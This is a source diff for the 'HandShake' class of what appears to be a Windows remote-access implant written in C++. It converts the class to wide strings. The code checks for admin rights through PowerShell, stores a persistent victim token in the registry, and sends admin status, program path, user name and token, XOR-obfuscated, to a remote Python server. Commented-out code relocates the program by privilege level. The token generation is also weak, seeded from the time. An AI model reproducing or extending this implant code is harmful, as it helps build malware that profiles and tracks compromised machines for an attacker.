@@ -20,19 +20,19 @@ HandShake::HandShake()
     {
         // Tokken not found
         a_token = generateToken(a_size_token);
-        cout << "New token: " << a_token << endl;
+        wcout << "New token: " << a_token << endl;
     }
     a_path_prog = setLocationProg();
 }
 
 
-void HandShake::setSock(int sock)
+VOID HandShake::setSock(SOCKET sock)
 {
     a_sock = sock;
 }
 
 
-void HandShake::beforeHandShake()
+VOID HandShake::beforeHandShake()
 {
     /*
     if(AUTO_MOVE) 
@@ -50,27 +50,27 @@ void HandShake::beforeHandShake()
 }
 
 
-void HandShake::startHandShake()
+VOID HandShake::startHandShake()
 {
     // ' SPLIT ' for split data in python server.py script
-    string is_admin;
-    string end = "\r\n";
+    wstring is_admin;
+    wstring end = L"\r\n";
 
     if(a_is_admin)
     {
         //If admin
-        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
+        is_admin = L"MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
     }
     else
     {
         //if not admin
-        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
+        is_admin = L"MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
     }
     //cout << a_path_prog << endl;
     //cout << a_name_user << endl;
-    string path_prog = "MOD_HANDSHAKE_PATH_PROG" SPLIT + ConvertWideToUtf8(a_path_prog);
-    string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + ConvertWideToUtf8(a_name_user);
-    string token = "MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
+    wstring path_prog = L"MOD_HANDSHAKE_PATH_PROG" SPLIT + a_path_prog;
+    wstring name_user = L"MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
+    wstring token = L"MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
    
     sendUltraSafe(a_sock, XOREncryption(is_admin));
     sendUltraSafe(a_sock, XOREncryption(path_prog));
@@ -82,7 +82,7 @@ void HandShake::startHandShake()
 
 BOOL HandShake::setIsAdmin()
 {
-    vector <string> result;
+    vector<string> result;
 
     result = Exec().executeCommand(L"powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
     if(result[0].substr(0,4) == "True") //remove ruturn line.
@@ -152,25 +152,24 @@ wstring HandShake::setLocationProg()
 }
 
 
-string HandShake::generateToken(const int token_size)//https://www.codespeedy.com/generate-random-hexadecimal-strings-in-cpp/
+wstring HandShake::generateToken(CONST INT token_size)//https://www.codespeedy.com/generate-random-hexadecimal-strings-in-cpp/
 {
-    string token;
-
-    CHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
-    int i;
+    wstring token;
+    WCHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
+    INT i;
 
     srand(time(0)); //https://stackoverflow.com/questions/1190689/problem-with-rand-in-c
     for(i=0;i< token_size;i++){token += hex_characters[rand()%16];}
-    //wcout << "\n\nTOKEN:  " << token << endl;
+    wcout << "\n\nTOKEN:  " << token << endl;
     return token;
 }
 
 
-string HandShake::getTokenOrSetTokenInRegistry()
+wstring HandShake::getTokenOrSetTokenInRegistry()
 {
     wstring tmp_return;
 
-    const WCHAR name[] = L"config"; //name of string key.
+    CONST WCHAR name[] = L"config"; //name of string key.
     WCHAR token[a_size_token];
 
     LONG status; //allows to check the situation of the functions 
@@ -181,13 +180,8 @@ string HandShake::getTokenOrSetTokenInRegistry()
 
     DWORD lpType = REG_SZ; //RegQueryValueExW
 
-
-    //--------------------------------------------------------------------------------
-
     HKEY HKEY_admin_or_not = NULL;
     WCHAR path_of_key[MAX_PATH];
-
-    //--------------------------------------------------------------------------------
 
     //Initialization of variables according to privileges. 
     if(a_is_admin) //test if admin | if admin set  HKEY_LOCAL_MACHINE else set HKCU
@@ -228,7 +222,7 @@ string HandShake::getTokenOrSetTokenInRegistry()
     {
         //string of key not found or token is not defined.
         ZeroMemory(&buffer, wcslen(buffer));
-        wcscpy(token, ConvertUtf8ToWide(generateToken(a_size_token)).c_str()); //(data)
+        wcscpy(token, generateToken(a_size_token).c_str()); //(data)
                 
         //set key:
         status =  RegSetValueExW(hKey, name ,0, REG_SZ, (LPBYTE) token, lpcbData);
@@ -247,13 +241,13 @@ string HandShake::getTokenOrSetTokenInRegistry()
         
         RegCloseKey(hKey);
         
-        return ConvertWideToUtf8(buffer);
+        return (wstring)buffer;
        
     }
     //cout << "token set " << endl;
     RegCloseKey(hKey);
     
-    return ConvertWideToUtf8(token);
+    return (wstring)token;
     
 }
 
@@ -276,13 +270,13 @@ wstring HandShake::getNameUser()
     return a_name_user;
 }
 
-string HandShake::getToken()
+wstring HandShake::getToken()
 {
     return a_token; 
 }
 
 /*
-void HandShake::moveProg()
+VOID HandShake::moveProg()
 {
    // Deplace le programme en fonction des privilèges de l'utilisateur.
     if(a_is_admin)
